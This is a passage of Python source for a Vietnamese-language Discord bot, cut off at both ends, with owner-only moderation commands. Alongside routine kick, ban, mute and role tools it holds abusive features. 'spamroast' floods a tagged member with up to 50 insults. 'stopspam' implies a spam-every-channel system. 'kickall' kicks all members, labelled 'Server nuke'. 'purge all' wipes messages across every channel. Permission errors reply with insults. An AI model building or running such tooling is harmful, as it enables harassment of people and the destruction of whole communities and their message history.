        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="stopspam")
@is_bot_owner()
async def stop_spam(ctx):
    global is_spamming, spam_task_running
    if not is_spamming:
        await ctx.send("❌ Hệ thống spam đang không chạy!")
        return

    is_spamming = False
    if spam_task_running:
        spam_task_running.cancel()
        spam_task_running = None
    await ctx.send("🛑 **ĐÃ DỪNG SPAM TẤT CẢ KÊNH!**")

@stop_spam.error
async def stop_spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="spamroast")
@is_bot_owner()
async def spam_roast(ctx, member: discord.Member, count: int = 10):
    if count > 50:
        count = 50
    await ctx.send(f"🚀 **Bắt đầu spam chửi {member.mention} ({count} lần)...**")
    for i in range(count):
        roast_template = random.choice(ROAST_LINES)
        msg = roast_template.format(username=member.mention)
        try:
            await ctx.send(msg)
        except:
            pass
        await asyncio.sleep(0.8)

@spam_roast.error
async def spam_roast_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH QUẢN TRỊ (KICK, BAN, UNBAN, MASSBAN, MUTE, UNMUTE, TIMEOUT, DEAFEN, UNDEAFEN, MOVE, MOVEALL, WARN, KICKALL, MASSKICK) ====================
@bot.command(name="kick")
@is_bot_owner()
async def kick_user(ctx, member: discord.Member, *, reason: str = "Không có lý do"):
    try:
        if member.id == ctx.author.id:
            await ctx.send("❌ Không thể kick chính mình!")
            return
        if member.id in BOT_OWNERS:
            await ctx.send("❌ Không thể kick Owner!")
            return
        await member.kick(reason=reason)
        embed = discord.Embed(
            title="🦵 ĐÃ KICK THÀNH VIÊN",
            description=f"👤 **Người bị kick:** {member.mention}\n📌 **Lý do:** {reason}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF9900
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@kick_user.error
async def kick_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="ban")
@is_bot_owner()
async def ban_user(ctx, member: discord.Member, *, reason: str = "Không có lý do"):
    try:
        if member.id == ctx.author.id:
            await ctx.send("❌ Không thể ban chính mình!")
            return
        if member.id in BOT_OWNERS:
            await ctx.send("❌ Không thể ban Owner!")
            return
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="🔨 ĐÃ BAN THÀNH VIÊN",
            description=f"👤 **Người bị ban:** {member.mention}\n📌 **Lý do:** {reason}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF0000
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@ban_user.error
async def ban_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="unban")
@is_bot_owner()
async def unban_user(ctx, user_id: int, *, reason: str = "Không có lý do"):
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user, reason=reason)
        embed = discord.Embed(
            title="✅ ĐÃ UNBAN THÀNH VIÊN",
            description=f"👤 **Người được unban:** {user.mention}\n📌 **Lý do:** {reason}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=user.display_avatar.url)
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@unban_user.error
async def unban_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="massban")
@is_bot_owner()
async def massban(ctx, *members: discord.Member):
    if not members:
        await ctx.send("❌ Cần tag ít nhất 1 người. VD: `n! massban @user1 @user2`")
        return
    success = 0
    failed = 0
    for member in members:
        if member.id == ctx.author.id or member.id in BOT_OWNERS or member == ctx.guild.owner:
            failed += 1
            continue
        try:
            await member.ban(reason="Mass ban từ Boss Bảo")
            success += 1
        except:
            failed += 1

    embed = discord.Embed(
        title="🔨 KẾT QUẢ MASS BAN",
        description=f"✅ Đã ban: **{success}** thành viên\n❌ Thất bại: **{failed}** thành viên",
        color=0xFF0000
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

@massban.error
async def massban_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="mute")
@is_bot_owner()
async def mute(ctx, member: discord.Member, duration: str = None, *, reason="Không có lý do"):
    try:
        time_delta = None
        duration_text = "Vĩnh viễn"
        if duration:
            unit = duration[-1].lower()
            try:
                val = int(duration[:-1])
            except ValueError:
                await ctx.send("❌ Sai định dạng thời gian! Ví dụ: `10m` (phút), `2d` (ngày), `1w` (tuần), `1t` (tháng).")
                return
            if unit == 'm':
                time_delta = timedelta(minutes=val)
                duration_text = f"{val} phút"
            elif unit == 'd':
                time_delta = timedelta(days=val)
                duration_text = f"{val} ngày"
            elif unit == 'w':
                time_delta = timedelta(weeks=val)
                duration_text = f"{val} tuần"
            elif unit == 't':
                time_delta = timedelta(days=val * 30)
                duration_text = f"{val} tháng"
            else:
                await ctx.send("❌ Đơn vị thời gian không hợp lệ! Dùng: **m** (phút), **d** (ngày), **w** (tuần), **t** (tháng).")
                return
        muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
        if not muted_role:
            muted_role = await ctx.guild.create_role(name="Muted", permissions=discord.Permissions(send_messages=False, speak=False))
            for channel in ctx.guild.channels:
                try:
                    await channel.set_permissions(muted_role, send_messages=False, speak=False)
                except:
                    pass
        await member.add_roles(muted_role, reason=f"Lệnh từ Boss Bảo - {reason}")
        if time_delta:
            try:
                await member.timeout(time_delta, reason=reason)
            except:
                pass
        embed = discord.Embed(
            title="🔇 🌈 **ĐÃ MUTE THÀNH VIÊN** 🌈",
            description=f"👤 **Thành viên:** {member.mention}\n⏳ **Thời gian:** {duration_text}\n📌 **Lý do:** {reason}",
            color=0xFF9900
        )
        await ctx.send(embed=embed)
        try:
            dm_embed = discord.Embed(
                title="🔇 **BẠN ĐÃ BỊ MUTE TRONG SERVER** 🔇",
                description=(
                    f"🏰 **Máy chủ:** {ctx.guild.name}\n"
                    f"⏳ **Thời hạn mute:** {duration_text}\n"
                    f"📌 **Lý do:** {reason}\n\n"
                    f"⚠️ Vui lòng rút kinh nghiệm và tuân thủ nội quy server để tránh bị xử phạt nặng hơn nhé!"
                ),
                color=0xFF0000
            )
            dm_embed.set_footer(text="Hệ thống kiểm duyệt độc quyền của Boss Bảo")
            await member.send(embed=dm_embed)
        except:
            pass
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@mute.error
async def mute_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="unmute")
@is_bot_owner()
async def unmute(ctx, member: discord.Member):
    try:
        muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
        unmuted_status = False
        if muted_role and muted_role in member.roles:
            await member.remove_roles(muted_role, reason="Lệnh từ Boss Bảo")
            unmuted_status = True
        try:
            await member.timeout(None, reason="Lệnh unmute từ Boss Bảo")
            unmuted_status = True
        except:
            pass
        if unmuted_status:
            embed = discord.Embed(
                title="🔊 🌈 **ĐÃ BỎ MUTE THÀNH VIÊN** 🌈",
                description=f"👤 {member.mention} đã được bỏ mute và khôi phục quyền trò chuyện.",
                color=0x00FF00
            )
            await ctx.send(embed=embed)
            try:
                dm_embed = discord.Embed(
                    title="🔊 **BẠN ĐÃ ĐƯỢC UNMUTE!** 🔊",
                    description=(
                        f"✨ Chúc mừng bạn! Lệnh cấm chat tại máy chủ **{ctx.guild.name}** đã được gỡ bỏ.\n"
                        f"🎉 Bạn có thể tiếp tục trò chuyện bình thường. Hãy giữ gìn nội quy server nhé!"
                    ),
                    color=0x00FF00
                )
                dm_embed.set_footer(text="Hệ thống kiểm duyệt độc quyền của Boss Bảo")
                await member.send(embed=dm_embed)
            except:
                pass
        else:
            await ctx.send("⚠️ Thành viên này hiện không bị mute.")
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@unmute.error
async def unmute_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="timeout")
@is_bot_owner()
async def timeout(ctx, member: discord.Member, duration: str, *, reason="Không có lý do"):
    try:
        unit = duration[-1].lower()
        val = int(duration[:-1])
        if unit == 'm':
            td = timedelta(minutes=val)
        elif unit == 'd':
            td = timedelta(days=val)
        elif unit == 'w':
            td = timedelta(weeks=val)
        elif unit == 't':
            td = timedelta(days=val*30)
        else:
            await ctx.send("❌ Đơn vị không hợp lệ! Dùng m, d, w, t.")
            return
        await member.timeout(td, reason=reason)
        embed = discord.Embed(
            title="⏳ ĐÃ TIMEOUT THÀNH VIÊN",
            description=f"👤 {member.mention}\n⏳ Thời gian: {duration}\n📌 Lý do: {reason}",
            color=0xFF9900
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@timeout.error
async def timeout_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deafen")
@is_bot_owner()
async def deafen(ctx, member: discord.Member):
    try:
        await member.edit(deafen=True)
        embed = discord.Embed(
            title="🔇 ĐÃ LÀM ĐIẾC THÀNH VIÊN",
            description=f"👤 {member.mention} đã bị điếc trong voice.",
            color=0xFF9900
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@deafen.error
async def deafen_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="undeafen")
@is_bot_owner()
async def undeafen(ctx, member: discord.Member):
    try:
        await member.edit(deafen=False)
        embed = discord.Embed(
            title="🔊 ĐÃ BỎ ĐIẾC THÀNH VIÊN",
            description=f"👤 {member.mention} đã có thể nghe lại trong voice.",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@undeafen.error
async def undeafen_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="move")
@is_bot_owner()
async def move_member(ctx, member: discord.Member, channel: discord.VoiceChannel):
    try:
        await member.move_to(channel)
        embed = discord.Embed(
            title="🚪 ĐÃ DI CHUYỂN THÀNH VIÊN",
            description=f"👤 {member.mention} đã được chuyển vào {channel.mention}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@move_member.error
async def move_member_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="moveall")
@is_bot_owner()
async def move_all_voice(ctx, channel: discord.VoiceChannel = None):
    if channel is None:
        await ctx.send("❌ Vui lòng tag voice channel! VD: `n! moveall #voice`")
        return
    try:
        count = 0
        for vc in ctx.guild.voice_channels:
            for member in vc.members:
                await member.move_to(channel)
                count += 1
                await asyncio.sleep(0.1)
        embed = discord.Embed(
            title="🚪 ĐÃ DI CHUYỂN TẤT CẢ",
            description=f"✅ Đã di chuyển **{count}** người vào {channel.mention}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@move_all_voice.error
async def move_all_voice_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="warn")
@is_bot_owner()
async def warn(ctx, member: discord.Member, *, reason="Cảnh cáo chung"):
    try:
        embed = discord.Embed(
            title="⚠️ 🌈 **CẢNH CÁO TỪ BOSS BẢO** 🌈",
            description=f"Bạn đã bị cảnh cáo trong server **{ctx.guild.name}**\n📌 Lý do: {reason}",
            color=0xFF0000
        )
        await member.send(embed=embed)
        await ctx.send(f"✅ Đã gửi cảnh cáo đến {member.mention}.")
    except:
        await ctx.send("❌ Không thể gửi tin nhắn riêng cho thành viên này.")

@warn.error
async def warn_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="kickall")
@is_bot_owner()
async def kick_all_members(ctx):
    try:
        confirm_embed = discord.Embed(
            title="⚠️ 🌈 **XÁC NHẬN KICK TẤT CẢ THÀNH VIÊN** 🌈 ⚠️",
            description=(
                f"🔥 **Boss Bảo kính yêu!**\n\n"
                f"Lệnh này sẽ kick toàn bộ thành viên trừ Boss và bot.\n\n"
                f"🔹 **Gõ n! confirmkickall để xác nhận**\n"
                f"🔹 **Gõ bất kỳ tin nhắn nào khác để hủy bỏ**"
            ),
            color=0xFF0000
        )
        await ctx.send(embed=confirm_embed)
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            msg = await bot.wait_for('message', timeout=30.0, check=check)
            if msg.content.lower() != "n! confirmkickall":
                await ctx.send("❌ Hủy bỏ.")
                return
        except asyncio.TimeoutError:
            await ctx.send("⏳ Hết thời gian.")
            return
        embed = discord.Embed(
            title="🚀 🌈 **ĐANG KICK THÀNH VIÊN...** 🌈",
            description="🔥 **Đang thực hiện...** 🔥",
            color=0xFF0000
        )
        await ctx.send(embed=embed)
        members = [m for m in ctx.guild.members if not m.bot and m.id not in BOT_OWNERS and m.id != ctx.guild.owner_id]
        for i in range(0, len(members), 10):
            batch = members[i:i+10]
            tasks = [m.kick(reason="Server nuke theo lệnh Boss Bảo") for m in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(1)
        complete_embed = discord.Embed(
            title="✅ 🌈 **KICK HOÀN TẤT** 🌈",
            description="🎉 **Đã thực thi xong!**",
            color=0x00FF00
        )
        await ctx.send(embed=complete_embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@kick_all_members.error
async def kick_all_members_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="masskick")
@is_bot_owner()
async def masskick(ctx, *members: discord.Member):
    if not members:
        await ctx.send("❌ Cần tag ít nhất 1 người. VD: `n! masskick @user1 @user2`")
        return
    success = 0
    failed = 0
    for member in members:
        if member.id == ctx.author.id or member.id in BOT_OWNERS or member == ctx.guild.owner:
            failed += 1
            continue
        try:
            await member.kick(reason="Mass kick từ Boss Bảo")
            success += 1
        except:
            failed += 1
    embed = discord.Embed(
        title="👢 MASS KICK",
        description=f"✅ Đã kick **{success}** người\n❌ Thất bại: **{failed}** người",
        color=0xFF9900 if failed else 0x00FF00
    )
    embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
    await ctx.send(embed=embed)

@masskick.error
async def masskick_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== LỆNH QUẢN LÝ KÊNH & ROLE ====================
@bot.command(name="createchannel")
@is_bot_owner()
async def create_channel(ctx, *, name: str):
    try:
        channel = await ctx.guild.create_text_channel(name)
        embed = discord.Embed(
            title="🆕 ĐÃ TẠO KÊNH MỚI",
            description=f"📌 **Tên kênh:** {channel.mention}\n👑 **Người tạo:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@create_channel.error
async def create_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deletechannel")
@is_bot_owner()
async def delete_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        channel_name = channel.name
        await channel.delete()
        embed = discord.Embed(
            title="🗑️ ĐÃ XÓA KÊNH",
            description=f"📌 **Tên kênh:** `{channel_name}`\n👑 **Người xóa:** {ctx.author.mention}",
            color=0xFF0000
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_channel.error
async def delete_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="lockchannel", aliases=["lock"])
@is_bot_owner()
async def lock_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, send_messages=False)
        embed = discord.Embed(
            title="🔒 ĐÃ KHÓA KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n🔒 Mọi người không thể gửi tin nhắn vào kênh này nữa.",
            color=0xFF0000
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@lock_channel.error
async def lock_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="unlockchannel", aliases=["unlock"])
@is_bot_owner()
async def unlock_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, send_messages=True)
        embed = discord.Embed(
            title="🔓 ĐÃ MỞ KHÓA KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n🔓 Mọi người đã có thể gửi tin nhắn bình thường.",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@unlock_channel.error
async def unlock_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="createrole")
@is_bot_owner()
async def create_role(ctx, *, role_name: str):
    try:
        role = await ctx.guild.create_role(name=role_name, reason="Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="🎭 ĐÃ TẠO ROLE MỚI",
            description=f"📌 **Role:** {role.mention}\n👑 **Người tạo:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@create_role.error
async def create_role_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="deleterole")
@is_bot_owner()
async def delete_role(ctx, *, role_name: str):
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        role_n = role.name
        await role.delete(reason="Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="🗑️ ĐÃ XÓA ROLE",
            description=f"📌 **Role:** `{role_n}`\n👑 **Người xóa:** {ctx.author.mention}",
            color=0xFF0000
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@delete_role.error
async def delete_role_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="role")
@is_bot_owner()
async def add_role_to_user(ctx, member: discord.Member, *, role_name: str):
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        await member.add_roles(role, reason=f"Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="✅ ĐÃ THÊM ROLE",
            description=f"👤 **Người nhận:** {member.mention}\n🎭 **Role:** {role.mention}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@add_role_to_user.error
async def add_role_to_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="removerole")
@is_bot_owner()
async def remove_role_from_user(ctx, member: discord.Member, *, role_name: str):
    try:
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        if not role:
            await ctx.send(f"❌ Không tìm thấy role `{role_name}`!")
            return
        await member.remove_roles(role, reason=f"Lệnh từ Boss Bảo")
        embed = discord.Embed(
            title="✅ ĐÃ XÓA ROLE",
            description=f"👤 **Người bị xóa:** {member.mention}\n🎭 **Role:** {role.mention}\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF9900
        )
        embed.set_thumbnail(url=member.display_avatar.url)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@remove_role_from_user.error
async def remove_role_from_user_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="purge")
@is_bot_owner()
async def purge_all(ctx, confirm: str = None):
    if confirm is None or confirm.lower() != "all":
        await ctx.send("⚠️ **CẢNH BÁO!** Lệnh này sẽ xóa TOÀN BỘ tin nhắn trong server!\n🔹 Gõ `n! purge all` để xác nhận.")
        return

    embed = discord.Embed(
        title="🧹 ĐANG XÓA TOÀN BỘ TIN NHẮN...",
        description="⏳ Đang xử lý, vui lòng đợi...",
        color=0xFF9900
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    await ctx.send(embed=embed)

    try:
        total_deleted = 0
        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    deleted = await channel.purge(limit=1000)
                    total_deleted += len(deleted)
                    await asyncio.sleep(1)
                except:
                    pass
        embed = discord.Embed(
            title="✅ ĐÃ XÓA TOÀN BỘ TIN NHẮN",
            description=f"🧹 Đã xóa tổng cộng **{total_deleted}** tin nhắn trong server!\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@purge_all.error
async def purge_all_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="clear")
@is_bot_owner()
async def clear(ctx, amount: int = 10):
    if amount < 1 or amount > 1000:
        await ctx.send("⚠️ Số lượng từ 1 đến 1000.")
        return
    try:
        deleted = await ctx.channel.purge(limit=amount)
        embed = discord.Embed(
            title="🧹 ĐÃ XÓA TIN NHẮN",
            description=f"Đã xóa thành công **{len(deleted)}** tin nhắn.",
            color=0x00CCFF
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed, delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@clear.error
async def clear_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="createcategory")
@is_bot_owner()
async def create_category(ctx, *, name: str):
    try:
        category = await ctx.guild.create_category(name)
        embed = discord.Embed(
            title="📁 ĐÃ TẠO DANH MỤC MỚI",
            description=f"✅ Danh mục **{category.name}** đã được tạo thành công.",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@create_category.error
async def create_category_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="renamechannel")
@is_bot_owner()
async def rename_channel(ctx, channel: discord.TextChannel, *, new_name: str):
    try:
        old_name = channel.name
        await channel.edit(name=new_name)
        embed = discord.Embed(
            title="✏️ ĐÃ ĐỔI TÊN KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n**Tên cũ:** `{old_name}`\n**Tên mới:** `{new_name}`",
            color=0x00FF00
        )
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@rename_channel.error
async def rename_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="settopic")
@is_bot_owner()
async def set_topic(ctx, channel: discord.TextChannel, *, topic: str):
    try:
        await channel.edit(topic=topic)
        embed = discord.Embed(
            title="📝 ĐÃ ĐẶT CHỦ ĐỀ KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n**Chủ đề:** {topic}",
            color=0x00FF00
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_topic.error
async def set_topic_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="setnsfw")
@is_bot_owner()
async def set_nsfw(ctx, channel: discord.TextChannel, nsfw: bool):
    try:
        await channel.edit(nsfw=nsfw)
        status = "Bật" if nsfw else "Tắt"
        embed = discord.Embed(
            title="🔞 ĐÃ THAY ĐỔI CHẾ ĐỘ NSFW",
            description=f"📌 **Kênh:** {channel.mention}\n**Trạng thái:** {status}",
            color=0x00FF00 if nsfw else 0xFF9900
        )
        embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@set_nsfw.error
async def set_nsfw_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="hide")
@is_bot_owner()
async def hide_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, view_channel=False)
        embed = discord.Embed(
            title="🙈 ĐÃ ẨN KÊNH",
            description=f"📌 **Kênh:** {channel.mention}\n🔒 Chỉ admin mới thấy được!\n👑 **Người thực hiện:** {ctx.author.mention}",
            color=0xFF9900
        )
        embed.set_footer(text="Hệ thống quản trị Boss Bảo 💖")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@hide_channel.error
async def hide_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="reveal")
@is_bot_owner()
async def reveal_channel(ctx, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    try:
        await channel.set_permissions(ctx.guild.default_role, view_channel=True)
        embed = discord.Embed(
            title="👀 ĐÃ HIỆN KÊNH",
